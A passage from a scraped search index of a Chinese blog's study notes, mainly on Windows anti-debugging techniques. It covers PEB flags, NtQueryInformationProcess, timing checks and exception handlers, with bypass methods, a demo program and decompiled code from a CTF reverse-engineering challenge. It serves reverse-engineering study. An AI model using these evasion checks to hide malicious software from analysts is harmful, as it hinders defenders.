","date":"2020-06-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/:2:0","tags":null,"title":"Android脱壳","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/"},{"categories":["notes"],"content":"参考链接 ApkShelling脱壳和FART脱壳 Frida从入门到入门—安卓逆向菜鸟的frida食用说明 初识Frida–Android逆向之Java层hook ","date":"2020-06-15","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/:3:0","tags":null,"title":"Android脱壳","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%94%E5%8D%81%E4%BA%8C%E5%A4%A9-android%E8%84%B1%E5%A3%B3/"},{"categories":["notes"],"content":"静态反调试 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:0","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"查看PEB.BeingDebugged的值 即IsDebuggerPresent()的实现方式，如果该值为1，则表示当前进程被调试。 PEB访问方法： 直接获取PEB地址 MOV EAX, DWORD PTR FS:[30] ; FS[30] = address of PEB 先获取TEB地址，在通过ProcessEnvironmentBlock成员(+30偏移)获取PEB地址 MOV EAX, DWORD PTR FS:[18] ; FS[18] = address of TEB MOV EAX, DWORD PTR DS:[EAX+30] ; DS[EAX+30] = address of PEB ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:1","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"PEB.Ldr(PEB+0xC) （仅限在WindowsXP系统，之后的系统无法使用，且以附加形式将无法在堆内存中出现上述标识） 调试进程时，其堆内存会出现一些奇怪的标志，表示它正处于被调试状态。最醒目的是，未使用的堆内存区域全部填充着0xEEFEEEFE,这证明该进程正在被调试。 PEB.Ldr指向_PEB_LDR_DATA结构体的指针，而_PEB_LDR_DATA结构体结构体又恰好在堆内存中创建，所以扫描该区域是否存在0xEEFEEEFE区域即可判断。 破解方法：将相关0xEEFEEEFE区域全部覆盖为NULL即可。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:2","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"PEB.Process Heap(PEB+0x18) （仅限在WindowsXP系统，且以附加形式将无法在堆内存中出现上述特征） PEB.Process Heap成员既可以直接从PEB结构体获取，也可以从GetProcessHeap()API获取。 HEAP(PEB+0x18)地址(黄色方框)为0x00790000 我们访问0x00790000 进程正常运行(非调试运行)时，Heap.Flags成员（+0xC）的值为0x2,Heap.ForceFlags成员(+0x10)的值为0x0. 进程处于被调试状态时，这些值也会随之改变。比较这些值即可判断。 破解方法：将Heap.Flags与Heap.ForceFlags的值分别重新设置为2与0即可。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:3","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"NtGlobalFalg(PEB+0x68) (将运行中的进程附加到调试器的时候，NtGlobalFalg值不变) 调试进程时，PEB.NtGlobalFalg成员(+0x68)的值会被设置为0x70.所以，检测该成员的值即可判断进程是否处于被调试阶段. NtGlobalFalg 0x70是由下列的flags值进行位或(bit OR)运算的结果 FLG_HEAP_ENABLE_TAIL_CHECK(0X10) FLG_HEAP_ENABLE_FREE_CHECK(0X20) FLG_HEAP_VALIDATE_PARAMETERS(0X40) 破解方法：设置PEB.NtGlobalFalg为0即可。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:4","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"NtQueryInformationProcess()系列 函数原型 __kernel_entry NTSTATUS NtQueryInformationProcess( IN HANDLE ProcessHandle, IN PROCESSINFOCLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength ); ProcessInformationClass为enum类型。其中，与调试器探测有关的成员为 ProcessDebugPort(0x7) ProcessDebugObjectHandle(0x1E) ProcessDebugFlags(0x1F) ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:5","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"ProcessDebugPort(0x7) 进程处于非调试阶段时，dwDebugPort的值为0，处于调试阶段，则为0xFFFFFFFF 例如 DWORD dwDebugPort=0; pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugPort, \u0026dwDebugPort, sizeof(dwDebugPort), NULL); if(dwDebugPort != 0) printf(\"being debuged\\n\"); 即CheckRemoteDebuggerPresent()函数的实现方法，该函数还可以检测其他进程是否处于被调试状态。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:6","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"ProcessDebugObjectHandle(0x1E) 如果进程处于被调试状态，则调试对象句柄存在，反之，该句柄值为NULL 例如 HANDLE hDebugObject = NULL; pNtQueryInformationProcess(GetCurrentProcess(),(PROCESSINFOCLASS)30 , \u0026hDebugObject, sizeof(hDebugObject), NULL); if(hDebugObject != null) printf(\"being debuged\\n\"); API文档头文件中的ProcessInformationClass成员中找不到此值，故直接写入30作为参数。当然，也可以自己声明好PROCESSINFOCLASS。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:7","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"ProcessDebugFlags(0x1F) 函数的第二个参数设置为ProcessDebugFlags(0x1F)后，调用函数后，通过第三个参数即可获取调试标志的值。如果为0，则进程处于被调试状态;若为1,则进程处于非调试状态。 BOOL bDebugFlag = TRUE; pNtQueryInformationProcess(GetCurrentProcess(), ProcessDebugFlags, \u0026bDebugFlag, sizeof(bDebugFlag), NULL); printf(\"NtQueryInformationProcess(ProcessDebugFlags) = 0x%X\\n\", bDebugFlag); if( bDebugFlag == 0x0 ) printf(\" =\u003e Debugging!!!\\n\\n\"); else printf(\" =\u003e Not debugging...\\n\\n\"); 注意，此处BOOL为大写，即与int等价（如果用了bool，会导致结果错误） ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:8","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"NtQuerySystemInformation() API文档 函数原型 __kernel_entry NTSTATUS NtQuerySystemInformation( IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength ); SystemInformationClass是枚举类型，其成员SystemKernelDebuggerInformation的值为0x23 向函数第一个参数传入0x23，通过获取的第二个参数SystemInformation结构体的DebuggerEnabled和DebuggerInfo的值即可判断。 注：当前(2018.12.26)的API文档中没有了SystemInformation结构体的定义，官方说明NtQuerySystemInformation可能将在未来的Windows版本中发生改变。 破解方法：windows7中在命令行窗口(管理员模式)执行bcdedit /debug off即可。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:9","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"NtQueryObject() 系统中的调试器调试进程的时候，会创建一个调试对象类型的内核对象。检测该对象是否存在即可判断是否有进程正在被调试。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:10","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"ZwSetInformationThread() 通过设置当前线程的信息来将自身从调试器中分离出来。 原理:隐藏当前线程，使调试器无法再收到该线程的调试事件。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:11","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"DebugActiveProcessStop() 用于分离调试器和被调试进程。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:1:12","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"动态反调试 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:0","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"异常 SEH SetUnhandledExceptionFilter() 进程中发生异常，若SEH未处理或者注册的SEH不存在，此时会调用执行系统的kernel32!UnhandledExceptionFilter()API.该函数内部会运行系统的最后一个异常处理器(名为Top Level Exception Filter或Last Exception Filter).系统最后的异常处理器通常会弹出错误消息框，然后终止进程运行。 kernel32!UnhandledExceptionFilter()API内部调用了ntdll!NtQueryInformationProcess(ProcessDebugPort)这个API（静态反调试），来判断是否正在调试进程。若进程正常运行（非调试状态），则运行系统最后的异常处理器，否则将异常派送给调试器。通过kernel32!SetUnhandledExceptionFilter可以修改系统最后的异常处理器。 基于异常的反调试技术中，通常先故意触发异常，然后在新注册的Last Exception Filter内部判断进程是正常运行还是调试运行，并根据判断结果修改EIP。 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:1","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"Timing Check 在调试器中逐行跟踪代码比程序正常运行耗费的时间要长很多，Timing Check技术通过计算运行的时间差异来判断进程是否处于被调试状态。 时间间隔测量 测量时间间隔的方法有很多，例如 基于计数器 RDTSC (汇编指令) kernel32!QueryPerformanceCounter() / ntdll!NtQueryPerformanceCounter() kernel32!GetTickCount() 基于时间 timeGetTime() __ftime() 计数器的精准程度从高到低： RDTSC\u003eNtQueryPerformanceCounter()\u003eGetTickCount() RDTSC x64CPU中存在一个名为TSC(Time Stamp Counter时间戳计数器)的64位寄存器。RDTSC这个汇编指令将TSC值读入EDX:EAX寄存器(高32位被保存到EDX，低32位被保存到EAX) ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:2","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"陷阱标志 陷阱标志指EFLAGS寄存器的第九个(Index 8)比特位, Trap Flag，（在x64dbg中表示为TF） TF设置为1后，CPU将进入单步执行模式。单步执行模式中，CPU执行1条指令后即触发EXCEPTION_SINGLE_STEP异常，然后TF会自动清零(0)。 INT 2D 在调试模式下执行完INT 2D后，下一条指令的第一个字节将被调试器忽略。（od的bug？）（若设置TF为1后再执行INT 2D，则不会忽略） ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:3","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"0xCC探测 API断点0xCC检测 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:4","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"比较校验和 ","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:2:5","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"异常处理 SEH: 结构化异常处理 VEH: 向量化异常处理 TopLevelEH：顶层异常处理 EXCEPTION_EXECUTE_HANDLER ：该异常被处理。从异常处下一条指令继续执行 EXCEPTION_CONTINUE_SEARCH：不能处理该异常，让别人处理它吧 EXCEPTION_CONTINUE_EXECUTION：该异常被忽略。从异常处处继续执行 //调试器返回值： DBG_CONTINUE ： 等同于EXCEPTION_CONTINUE_EXECUTION DBG_EXCEPTION_NOT_HANDLED ：等同于EXCEPTION_CONTINUE_SEARCH 异常处理器处理顺序流程： 交给调试器(进程必须被调试) 执行VEH 执行SEH TopLevelEH(进程被调试时不会被执行) 交给调试器(上面的异常处理都说处理不了，就再次交给调试器) 调用异常端口通知csrss.exe // exception.cpp : 此文件包含 \"main\" 函数。程序执行将在此处开始并结束。 // #include \u003cstdio.h\u003e #include \u003cwindows.h\u003e #include \"atlstr.h\" //先介绍一下返回值的意思 //EXCEPTION_EXECUTE_HANDLER //该指令异常被处理。从下一条指令继续执行 //EXCEPTION_CONTINUE_SEARCH //不能处理该异常，让别人处理它吧 //EXCEPTION_CONTINUE_EXECUTION //该指令被忽略。从该指令处继续执行 void ShowExceptionInfo(PEXCEPTION_POINTERS pExcepInfo) { } LONG ShowSelectMessageBox(TCHAR* pTitle) { int nRet = MessageBox(0, _T(\"--------\\n我要“认领”该异常?\\n--------\\nYES：认领该异常。\\n\\nNO: 交给别人处理(return EXCEPTION_CONTINUE_SEARCH)\"), pTitle, MB_YESNO); if (nRet != IDYES) {//让别人处理 _tprintf(_T(\"[EH.Exe] [SELE] Select EXCEPTION_CONTINUE_SEARCH\\n\")); return EXCEPTION_CONTINUE_SEARCH; } nRet = MessageBox(0, _T(\"--------\\n是“忽略”还是“处理”该异常?\\n--------\\nYES：忽略，从该指令处继续执行(return EXCEPTION_CONTINUE_EXECUTION)。\\n\\nNO: 处理，从下一条指令继续执行(return EXCEPTION_EXECUTE_HANDLER)\"), pTitle, MB_YESNO); if (nRet != IDYES) {//处理 _tprintf(_T(\"[EH.Exe] [SELE] Select EXCEPTION_EXECUTE_HANDLER\\n\")); return EXCEPTION_EXECUTE_HANDLER; } //忽略 _tprintf(_T(\"[EH.Exe] [SELE] Select EXCEPTION_CONTINUE_EXECUTION\\n\")); return EXCEPTION_CONTINUE_EXECUTION; } LONG NTAPI FirstVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"*首个* VEH异常处理器\"); _tprintf(_T(\"[EH.Exe] [VEH][1] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); if (nRet == EXCEPTION_EXECUTE_HANDLER) { _tprintf(_T(\"[EH.Exe] [VEH][1] EXCEPTION_EXECUTE_HANDLER 标志在VEH中无效！,所以第二个VEH被调用。\\n\")); } if (nRet == EXCEPTION_CONTINUE_EXECUTION) { if (MessageBox(0, _T(\"jmp int3？(跳过INT3指令,否则还会被断下)\"), _T(\"是否修正到下一条指令执行\"), MB_YESNO) == IDYES) { pExcepInfo-\u003eContextRecord-\u003eEip += 1;//跳过int3 _tprintf(_T(\"[EH.Exe] [VEH][1] 该异常被处理。 且：jmp int3\\n\")); } else { _tprintf(_T(\"[EH.Exe] [VEH][1] 该异常被处理\\n\")); } } _tprintf(_T(\"[EH.Exe] [VEH][1] out\\n\")); return nRet; } LONG NTAPI LastVectExcepHandler(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"*最后* VEH异常处理器\"); _tprintf(_T(\"[EH.Exe] [VEH][2] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); if (nRet == EXCEPTION_EXECUTE_HANDLER) { _tprintf(_T(\"[EH.Exe] [VEH][2] EXCEPTION_EXECUTE_HANDLER 标志在VEH中无效！,所以SEH被调用。\\n\")); } if (nRet == EXCEPTION_CONTINUE_EXECUTION) { if (MessageBox(0, _T(\"jmp int3？(跳过INT3指令,否则还会被断下)\"), _T(\"是否修正到下一条指令执行\"), MB_YESNO) == IDYES) { pExcepInfo-\u003eContextRecord-\u003eEip += 1;//跳过int3 _tprintf(_T(\"[EH.Exe] [VEH][2] 该异常被处理。 且：jmp int3\\n\")); } else { _tprintf(_T(\"[EH.Exe] [VEH][2] 该异常被处理\\n\")); } } _tprintf(_T(\"[EH.Exe] [VEH][2] out \\n\")); return nRet; } LONG NTAPI TopLevelExcepFilter(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"*顶级* 异常处理器\"); _tprintf(_T(\"[EH.Exe] [TOP] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); _tprintf(_T(\"[EH.Exe] [TOP] out \\n\"));; return nRet; } LONG FirstSEHer(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"第一个SEH处理器\"); _tprintf(_T(\"[EH.Exe] [SEH][1] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); _tprintf(_T(\"[EH.Exe] [SEH][1] out \\n\")); return nRet; } LONG SecondSEHer(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"第二个SEH处理器\"); _tprintf(_T(\"[EH.Exe] [SEH][2] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); _tprintf(_T(\"[EH.Exe] [SEH][2] out \\n\"));; return nRet; } LONG ThirdSEHer(PEXCEPTION_POINTERS pExcepInfo) { TCHAR* pTitle = _T(\"第三个SEH处理器\"); _tprintf(_T(\"[EH.Exe] [SEH][3] in \\n\")); LONG nRet = ShowSelectMessageBox(pTitle); _tprintf(_T(\"[EH.Exe] [SEH][3] out \\n\"));; return nRet; } void ExcepFunction() { __try { __try { _tprintf(_T(\"[EH.Exe] *[CALL] int 3\\n\")); __asm int 3; } __except (FirstSEHer(GetExceptionInformation())) { _tprintf(_T(\"[EH.Exe] [SEH][1] 被俺处理了~(只有返回EXCEPTION_EXECUTE_HANDLER才会走到这里)\\n\")); } } __except (SecondSEHer(GetExc","date":"2020-06-12","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/:3:0","tags":null,"title":"反调试技术","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E5%9B%9B%E5%8D%81%E4%B9%9D%E5%A4%A9-%E5%8F%8D%E8%B0%83%E8%AF%95/"},{"categories":["notes"],"content":"例子 空指针六月re公开赛这道题用了很多反调试的技术。 TLS回调函数中进行反调试检测 TLS回调函数是指，每当创建/终止进程的线程时，会自动调用执行的函数。创建或终止某线程时，TLS回调函数都会自动调用执行，前后共两次。 int __stdcall TlsCallback_0(int a1, int a2, int a3) { HMODULE v3; // eax FARPROC v4; // eax int result; // eax int v6; // [esp+DCh] [ebp-8h] v6 = 0; v3 = GetModuleHandleW(L\"ntdll.dll\"); v4 = GetProcAddress(v3, \"NtQueryInformationProcess\"); result = ((int (__stdcall *)(signed int, signed int, int *, signed int, _DWORD))v4)(-1, 7, \u0026v6, 4, 0); if ( result ) return result; if ( v6 ) { result = TlsIndex; *(_DWORD *)(*(_DWORD *)(__readfsdword(0x2Cu) + 4 * TlsIndex) + 4) = 0xDEADBEEF; } else { result = TlsIndex; *(_DWORD *)(*(_DWORD *)(__readfsdword(0x2Cu) + 4 * TlsIndex) + 4) = 0; } return result; } NtQueryInformationProcess，等于7检测ProcessDebugPort。 2. NtGlobalFalg(PEB+0x68) 调试进程时，PEB.NtGlobalFalg成员(+0x68)的值会被设置为0x70 __int64 sub_402740() { int v0; // edx __int64 v1; // ST00_8 signed int i; // [esp+D0h] [ebp-6Ch] int v4[24]; // [esp+DCh] [ebp-60h] v4[22] = 0; v4[22] = *(_DWORD *)(__readfsdword(0x30u) + 0x68) \u0026 0x70; v4[0] = 31; v4[1] = 43; v4[2] = 14; v4[3] = 87; v4[4] = 34; v4[5] = 64; v4[6] = 15; v4[7] = 7; v4[8] = 56; v4[9] = 32; v4[10] = 67; v4[11] = 98; v4[12] = 23; v4[13] = 45; v4[14] = 87; v4[15] = 63; v4[16] = 25; v4[17] = 74; v4[18] = 68; v4[19] = 88; if ( v4[22] != 23 ) { for ( i = 0; i \u003c 20; ++i ) byte_452F80[i] = LOBYTE(v4[i]) ^ (23 - LOBYTE(v4[22])); } AddVectoredExceptionHandler(0, Handler); HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1; } GetTickCount 获取时间间隔 int sub_402AB0() { __int16 v0; // STE8_2 v0 = GetTickCount(); return (((unsigned __int16)GetTickCount() - v0) \u0026 0xFF00) \u003e\u003e 8; } 校验和 这里不仅是代码不能修改，也不能下断点，因为断点的0xcc也会被检测 int __cdecl sub_4029E0(unsigned __int8 *a1, unsigned int a2) { int v3; // [esp+D0h] [ebp-8h] v3 = 0; while ( (unsigned int)a1 \u003c a2 ) v3 += *a1++; return v3; } __int64 sub_402470() { signed int v0; // edx __int64 v1; // ST00_8 signed int j; // [esp+D0h] [ebp-DCh] signed int i; // [esp+DCh] [ebp-D0h] int v5[24]; // [esp+E8h] [ebp-C4h] int v6; // [esp+150h] [ebp-5Ch] int v7; // [esp+15Ch] [ebp-50h] int v8; // [esp+168h] [ebp-44h] int v9; // [esp+174h] [ebp-38h] int v10; // [esp+180h] [ebp-2Ch] int v11; // [esp+18Ch] [ebp-20h] int v12; // [esp+198h] [ebp-14h] int v13; // [esp+1A4h] [ebp-8h] v13 = sub_402A30(); v12 = sub_402AB0(); v10 = sub_4029E0((unsigned __int8 *)sub_402B50 + 80, (unsigned int)sub_402B50 + 188); v9 = sub_4029E0((unsigned __int8 *)main + 16, (unsigned int)main + 206); v8 = sub_4029E0((unsigned __int8 *)sub_402E90 + 50, (unsigned int)sub_402E90 + 139); v7 = sub_4029E0((unsigned __int8 *)TopLevelExceptionFilter, (unsigned int)TopLevelExceptionFilter + 300); v6 = sub_4029E0((unsigned __int8 *)sub_402DC0 + 123, (unsigned int)sub_402DC0 + 136); v0 = (unsigned __int8)v8; v11 = (unsigned __int8)v6 + (unsigned __int8)v8 + (unsigned __int8)v7 + (unsigned __int8)v10 + (unsigned __int8)v9 + (*(_DWORD *)(*(_DWORD *)(__readfsdword(0x2Cu) + 4 * TlsIndex) + 4) \u0026 0xFF) + v12 + v13; v5[0] = 31; v5[1] = 43; v5[2] = 14; v5[3] = 87; v5[4] = 34; v5[5] = 64; v5[6] = 15; v5[7] = 7; v5[8] = 56; v5[9] = 32; v5[10] = 67; v5[11] = 98; v5[12] = 23; v5[13] = 45; v5[14] = 87; v5[15] = 63; v5[16] = 25; v5[17] = 74; v5[18] = 68; v5[19] = 88; v5[20] = 90; v5[21] = 113; v5[22] = 57; v5[23] = 97; if ( v11 ) { for ( i = 0; i \u003c 24; ++i ) { v0 = i; byte_452F80[i] = LOBYTE(v5[i]) ^ v11; } } else { for ( j = 0; j \u003c 24; ++j ) { LOBYTE(v0) = v5[j]; byte_452F80[j] = v0; } } HIDWORD(v1) = v0; LODWORD(v1) = 0; return v1; } VEH AddVectoredExceptionHandler(0, Handler); SetUnhandledExceptionFilter unsigned int sub_402DC0() { DWORD flOldProtect; // [esp+D0h] [ebp-2Ch] LPVOID lpAddress; // [esp+DCh] [ebp-20h] SIZE_T dwSize; // [esp+E8h] [ebp-14h] HMODULE v4; // [esp+F4h] [ebp-8h] v4 = GetModuleHandleW(0); SetUnhandledExceptionFilter((LPTOP_LEVEL_EXCEPTION_FILTER)TopLevelExceptionFilter); dwSize = 188; lpAddress = sub_402B50; dword_452FA0 = (int)sub_402B50; 